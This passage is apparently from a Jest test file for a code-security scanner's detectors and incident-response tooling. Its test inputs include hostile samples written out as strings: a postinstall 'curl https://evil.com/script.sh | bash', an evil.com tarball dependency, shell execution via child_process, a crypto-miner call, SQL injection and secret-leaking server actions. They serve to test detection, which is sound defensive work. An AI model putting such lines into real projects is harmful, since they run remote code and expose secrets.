      const analyzer = new BehavioralAnalyzer();
      const code = 'const fn = new Function("return " + code);';
      
      const findings = analyzer.analyze(code, 'test.js');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-005');
      expect(finding).toBeDefined();
    });

    test('should detect network requests to IP addresses', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = 'fetch("http://192.168.1.100/api/data");';
      
      const findings = analyzer.analyze(code, 'test.js');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-007');
      expect(finding).toBeDefined();
      expect(finding.category).toBe('network');
    });

    test('should detect requests to suspicious domains', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = 'fetch("https://pastebin.com/raw/abc123");';
      
      const findings = analyzer.analyze(code, 'test.js');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-008');
      expect(finding).toBeDefined();
    });

    test('should detect shell command execution', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = 'const cp = require("child_process"); cp.exec("bash -c whoami");';
      
      const findings = analyzer.analyze(code, 'test.js');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-009');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
    });

    test('should detect crypto mining calls', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = 'CoinHive.Anonymous("site-key").start();';
      
      const findings = analyzer.analyze(code, 'test.js');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-010');
      expect(finding).toBeDefined();
      expect(finding.category).toBe('crypto-mining');
    });

    test('should detect prototype pollution patterns', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = 'obj.__proto__.isAdmin = true;';
      
      const findings = analyzer.analyze(code, 'test.js');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-012');
      expect(finding).toBeDefined();
    });

    test('should detect base64 encoded malicious payloads', () => {
      const analyzer = new BehavioralAnalyzer();
      const maliciousBase64 = Buffer.from('eval(code)').toString('base64');
      const longBase64 = maliciousBase64.padEnd(510, 'A');
      const code = `const payload = "${longBase64}";`;
      
      const findings = analyzer.analyze(code, 'test.js');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-018');
      expect(finding).toBeDefined();
    });

    test('should detect SQL injection via template literals', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = 'const query = `SELECT * FROM users WHERE id = ${req.params.id}`;';
      
      const findings = analyzer.analyze(code, 'test.js');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-019');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
    });

    test('should handle TypeScript files', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = 'const result: string = eval(input as string);';
      
      const findings = analyzer.analyze(code, 'test.ts');
      
      expect(findings.length).toBeGreaterThan(0);
    });

    test('should handle JSX files', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = 'const App = () => <div dangerouslySetInnerHTML={{__html: eval(data)}} />;';
      
      const findings = analyzer.analyze(code, 'test.jsx');
      
      expect(findings.length).toBeGreaterThan(0);
    });

    test('should handle parse errors gracefully', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = 'const x = {{{invalid syntax';
      
      const findings = analyzer.analyze(code, 'test.js');
      
      expect(Array.isArray(findings)).toBe(true);
    });

    test('should detect React 19 use() with user input in fetch URL (BEHAV-023)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `const data = use(fetch(\`/api/users/\${searchParams.get('id')}\`));`;
      
      const findings = analyzer.analyze(code, 'component.tsx');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-023');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should NOT flag benign use() with static fetch URL (BEHAV-023 negative)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `const data = use(fetch('/api/static-endpoint'));`;
      
      const findings = analyzer.analyze(code, 'component.tsx');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-023');
      expect(finding).toBeUndefined();
    });

    test('should NOT flag use() with safe template literal (BEHAV-023 negative 2)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `const params = new URL('https://api.example.com'); const data = use(fetch(\`\${params.href}/users\`));`;
      
      const findings = analyzer.analyze(code, 'component.tsx');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-023');
      expect(finding).toBeUndefined();
    });

    test('should NOT flag use() with database query (BEHAV-023 negative 3)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `const data = use(fetch(\`/api/data/\${db.query('SELECT id FROM users')}\`));`;
      
      const findings = analyzer.analyze(code, 'component.tsx');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-023');
      expect(finding).toBeUndefined();
    });

    test('should detect nested req.query.user access (BEHAV-023 positive 2)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `const data = use(fetch(\`/api/users/\${req.query.userId}\`));`;
      
      const findings = analyzer.analyze(code, 'component.tsx');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-023');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect React 19 useActionState with code execution (BEHAV-024)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `const [state, action] = useActionState((prev, data) => { eval(data.code); return prev; });`;
      
      const findings = analyzer.analyze(code, 'component.tsx');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-024');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
    });

    test('should detect React 19 useOptimistic XSS risk (BEHAV-025)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `const [optimistic, addOptimistic] = useOptimistic(state, (prev, val) => { 
        return { html: val, render: (el) => el.innerHTML = val };
      });`;
      
      const findings = analyzer.analyze(code, 'component.tsx');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-025');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect React 19 server cache poisoning (BEHAV-027)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `const getCachedData = cache((userId) => { 
        return { user: userId, session: cookies().get('session') };
      });`;
      
      const findings = analyzer.analyze(code, 'actions.ts');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-027');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect CVE-2025-55184 DoS infinite loop in server context (BEHAV-028)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `'use server';
        export async function maliciousAction() {
          while (true) {
            // DoS attack
          }
        }`;
      
      const findings = analyzer.analyze(code, 'actions.ts');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-028');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect CVE-2025-55184 DoS recursive async scheduling (BEHAV-029)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `function loop() {
        setImmediate(() => setImmediate(loop));
      }`;
      
      const findings = analyzer.analyze(code, 'worker.js');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-029');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect CVE-2025-55183 server function toString exposure (BEHAV-030)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `'use server';
        export async function leakSource() {
          return (async function() { return process.env.API_KEY; }).toString();
        }`;
      
      const findings = analyzer.analyze(code, 'actions.ts');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-030');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect CVE-2025-55183 function stringification in server (BEHAV-031)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `'use server';
        export async function leak() {
          return String(function() { return process.env.SECRET; });
        }`;
      
      const findings = analyzer.analyze(code, 'actions.ts');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-031');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect CVE-2025-55183 response containing source code (BEHAV-032)', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = `'use server';
        export async function handler(req, res) {
          try {
            doSomething();
          } catch (e) {
            res.json({ error: e.stack.toString() });
          }
        }`;
      
      const findings = analyzer.analyze(code, 'actions.ts');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-032');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('medium');
    });
  });

  describe('Dependency Differ', () => {
    let DependencyDiffer;
    
    beforeAll(() => {
      DependencyDiffer = require('../scripts/fix-layer-8-security/detectors/dependency-differ');
    });

    test('should detect known malicious packages', () => {
      const differ = new DependencyDiffer();
      const deps = { 'event-stream': '3.3.4' };
      
      const findings = differ.checkForMaliciousPackages(deps, 'package.json');
      
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].severity).toBe('critical');
      expect(findings[0].signatureId).toBe('NEUROLINT-DEP-002');
    });

    test('should detect typosquatting attempts', () => {
      const differ = new DependencyDiffer();
      const deps = { 'expresss': '4.0.0' };
      
      const findings = differ.detectTyposquatting(deps, 'package.json');
      
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].signatureId).toBe('NEUROLINT-DEP-003');
    });

    test('should detect git URL dependencies', () => {
      const differ = new DependencyDiffer();
      const deps = { 'my-package': 'git+https://github.com/user/repo.git' };
      
      const findings = differ.checkSuspiciousVersions(deps, 'package.json');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-DEP-005');
      expect(finding).toBeDefined();
    });

    test('should detect suspicious URL dependencies', () => {
      const differ = new DependencyDiffer();
      const deps = { 'my-package': 'https://evil.com/malicious.tgz' };
      
      const findings = differ.checkSuspiciousVersions(deps, 'package.json');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-DEP-006');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect dangerous install scripts', () => {
      const differ = new DependencyDiffer();
      const packageJson = {
        scripts: {
          postinstall: 'curl https://evil.com/script.sh | bash'
        }
      };
      
      const findings = differ.checkScriptInjection(packageJson, 'package.json');
      
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].severity).toBe('critical');
    });

    test('should calculate Levenshtein distance correctly', () => {
      const differ = new DependencyDiffer();
      
      expect(differ.levenshteinDistance('lodash', 'lodash')).toBe(0);
      expect(differ.levenshteinDistance('lodash', 'lodahs')).toBe(2);
      expect(differ.levenshteinDistance('react', 'react-dom')).toBe(4);
    });

    test('should generate report summary', () => {
      const differ = new DependencyDiffer();
      const findings = [
        { severity: 'critical' },
        { severity: 'high' },
        { severity: 'medium' },
        { severity: 'low' }
      ];
      
      const report = differ.generateReport(findings);
      
      expect(report.summary.total).toBe(4);
      expect(report.summary.critical).toBe(1);
      expect(report.summary.high).toBe(1);
    });

    test('should detect local file dependencies', () => {
      const differ = new DependencyDiffer();
      const deps = { 'my-local': 'file:../local-package' };
      
      const findings = differ.checkSuspiciousVersions(deps, 'package.json');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-DEP-007');
      expect(finding).toBeDefined();
    });
  });

  describe('Timeline Reconstructor', () => {
    let TimelineReconstructor;
    
    beforeAll(() => {
      TimelineReconstructor = require('../scripts/fix-layer-8-security/forensics/timeline-reconstructor');
    });

    test('should detect when not in git repository', () => {
      const reconstructor = new TimelineReconstructor();
      
      const result = reconstructor.reconstructTimeline('/tmp/not-a-git-repo');
      
      expect(result.success).toBe(false);
      expect(result.error).toContain('Not a git repository');
    });

    test('should load suspicious patterns', () => {
      const reconstructor = new TimelineReconstructor();
      
      expect(reconstructor.suspiciousPatterns).toBeDefined();
      expect(reconstructor.suspiciousPatterns.length).toBeGreaterThan(0);
    });

    test('should assess risk correctly', () => {
      const reconstructor = new TimelineReconstructor();
      
      const criticalResult = { findings: [{ severity: 'critical' }, { severity: 'critical' }] };
      const cleanResult = { findings: [] };
      
      const criticalRisk = reconstructor.assessRisk(criticalResult);
      const cleanRisk = reconstructor.assessRisk(cleanResult);
      
      expect(criticalRisk.level).toBe('critical');
      expect(cleanRisk.level).toBe('clean');
    });

    test('should generate risk summary', () => {
      const reconstructor = new TimelineReconstructor();
      
      const summary = reconstructor.generateRiskSummary('critical', 5);
      
      expect(summary).toContain('CRITICAL');
      expect(summary).toContain('5');
    });

    test('should create findings with required fields', () => {
      const reconstructor = new TimelineReconstructor();
      
      const finding = reconstructor.createFinding({
        signatureId: 'TEST-001',
        signatureName: 'Test Finding',
        severity: 'high',
        description: 'Test description'
      });
      
      expect(finding.id).toBeDefined();
      expect(finding.timestamp).toBeDefined();
      expect(finding.confidence).toBeDefined();
    });

    test('should reconstruct timeline in git repository', () => {
      const reconstructor = new TimelineReconstructor({ maxCommits: 10 });
      
      const result = reconstructor.reconstructTimeline(process.cwd());
      
      expect(result.success).toBe(true);
      expect(Array.isArray(result.timeline)).toBe(true);
      expect(result.stats).toBeDefined();
    });

    test('should generate report from result', () => {
      const reconstructor = new TimelineReconstructor();
      const mockResult = {
        success: true,
        timeline: [
          {
            shortHash: 'abc123',
            author: 'Test',
            date: new Date().toISOString(),
            subject: 'Test commit',
            newFiles: ['a.js'],
            modifiedFiles: ['b.js'],
            deletedFiles: [],
            suspiciousChanges: []
          }
        ],
        findings: [],
        stats: { totalCommits: 1 }
      };
      
      const report = reconstructor.generateReport(mockResult);
      
      expect(report.success).toBe(true);
      expect(report.timeline.length).toBe(1);
      expect(report.riskAssessment).toBeDefined();
    });
  });

  describe('Incident Response', () => {
    test('should expose incidentResponse method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.incidentResponse).toBe('function');
    });

    test('should run incident response with all phases', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      
      const result = await layer8.incidentResponse(fixturesPath, {
        includeTimeline: true,
        includeDependencies: true,
        includeBehavioral: true
      });
      
      expect(result.timestamp).toBeDefined();
      expect(result.targetPath).toBeDefined();
      expect(result.phases).toBeDefined();
      expect(result.summary).toBeDefined();
      expect(result.recommendations).toBeDefined();
    });

    test('should calculate risk levels correctly', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      
      const result = await layer8.incidentResponse(fixturesPath, {
        includeTimeline: false,
        includeDependencies: false,
        includeBehavioral: false
      });
      
      expect(['clean', 'low', 'medium', 'high', 'critical']).toContain(result.summary.riskLevel);
    });

    test('should generate recommendations', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      
      const result = await layer8.incidentResponse(fixturesPath);
      
      expect(Array.isArray(result.recommendations)).toBe(true);
      if (result.recommendations.length > 0) {
        expect(result.recommendations[0].priority).toBeDefined();
        expect(result.recommendations[0].action).toBeDefined();
      }
    });

    test('should aggregate findings from all phases', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      
      const result = await layer8.incidentResponse(fixturesPath, {
        includeTimeline: true,
        includeDependencies: true,
        includeBehavioral: true
      });
      
      expect(result.allFindings).toBeDefined();
      expect(Array.isArray(result.allFindings)).toBe(true);
    });

    test('should track execution time', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      
      const result = await layer8.incidentResponse(fixturesPath);
      
      expect(result.summary.executionTimeMs).toBeDefined();
      expect(typeof result.summary.executionTimeMs).toBe('number');
    });

    test('should expose printIncidentReport method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.printIncidentReport).toBe('function');
    });

    test('should set success status and track phase failures', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      
      const result = await layer8.incidentResponse(fixturesPath, {
        includeTimeline: true,
        includeDependencies: true,
        includeBehavioral: true
      });
      
      expect(result.success).toBeDefined();
      expect(typeof result.success).toBe('boolean');
      expect(result.summary.phasesCompleted).toBeDefined();
      expect(result.summary.phasesTotal).toBeDefined();
      expect(result.summary.phasesFailed).toBeDefined();
    });
  });

  describe('CLI Incident Response Command', () => {
    test('should show help for security:incident-response command', () => {
      const output = execSync('node cli.js help 2>&1', { encoding: 'utf8' });
      
      expect(output).toContain('security:incident-response');
    });

    test('should run incident response via CLI', () => {
      const output = execSync(
        `node cli.js security:incident-response ${fixturesPath} --quick 2>&1`,
        { encoding: 'utf8', timeout: 60000 }
      );
      
      expect(output).toContain('INCIDENT RESPONSE');
    });

    test('should support --json output for incident response', () => {
      const output = execSync(
        `node cli.js security:incident-response ${fixturesPath} --quick --json 2>&1`,
        { encoding: 'utf8', timeout: 60000 }
      );
      
      const jsonMatch = output.match(/\{[\s\S]*\}/);
      expect(jsonMatch).toBeTruthy();
      expect(() => JSON.parse(jsonMatch[0])).not.toThrow();
    });
  });
});
